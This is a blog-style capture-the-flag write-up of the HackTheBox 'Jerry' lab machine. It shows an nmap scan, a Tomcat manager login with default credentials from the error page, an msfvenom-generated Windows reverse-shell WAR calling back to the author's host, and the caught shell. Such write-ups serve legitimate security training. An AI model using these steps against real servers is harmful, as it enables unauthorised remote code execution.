---
layout: page
title: Jerry
description: Jerry from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/jerry/logo.png" title="HTB Jerry Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/Jerry">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Jerry! Jerry! Jerry!

Get all the open ports with nmap.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/jerry]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.95                    
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-19 18:25 AEDT
Nmap scan report for 10.10.10.95
Host is up (0.017s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2008|7 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (97%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   20.26 ms 10.10.16.1
2   20.31 ms 10.10.10.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.73 seconds
```
{% endraw %}

<br />
Navigate to the web server running on 8080.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/jerry/tomcat.png" title="Check the Web Server" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Click on Manager App and try logging in with the prompt that appears.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/jerry/logintest.png" title="Test the Login" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Read the 401 page and the the credentials that are listed in the example user.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/jerry/unauth.png" title="401 Unauthorized" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Login with the credentials from the error page.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/jerry/tomcatlanding.png" title="Tomcat Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Notice the section of the page to deploy a Java war secion.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/jerry/deploywarsection.png" title="War Deploy Section" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use msfvenom to generate a war exploit.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/jerry]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f war -o shell.war
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of war file: 52154 bytes
Saved as: shell.war
```
{% endraw %}

<br />
Unzip the war and note the name of the jsp file.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/jerry]
└─$ unzip shell.war                           
Archive:  shell.war
   creating: META-INF/
  inflating: META-INF/MANIFEST.MF    
   creating: WEB-INF/
  inflating: WEB-INF/web.xml         
  inflating: zwqjmwevu.jsp           
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/jerry]
└─$ ls
META-INF  WEB-INF  nmap  shell.war  zwqjmwevu.jsp
```
{% endraw %}

<br />
Start a listener.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/jerry]
└─$ nc -nlvp 4444                          
listening on [any] 4444 ...
```
{% endraw %}

<br />
Click Browse and in the dialog box double-click on the war file.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/jerry/dblclkwar.png" title="Choose war file" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Click the deploy button.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/jerry/deploy.png" title="Deploy the War" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Navigate to the war file and the to the jsp file that we noted earlier.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/jerry/jsp.png" title="Navigate to JSP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the listener and catch the shell.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/jerry]
└─$ nc -nlvp 4444                          
listening on [any] 4444 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```
{% endraw %}

<br />

{% raw %}
```sh
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
<redacted>

root.txt
<redacted>
C:\Users\Administrator\Desktop\flags>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.95
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{4C9FEAFE-6811-4938-BFB6-5A3280613EF9}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
```
{% endraw %}

<br />
And with that, another one bites the dust.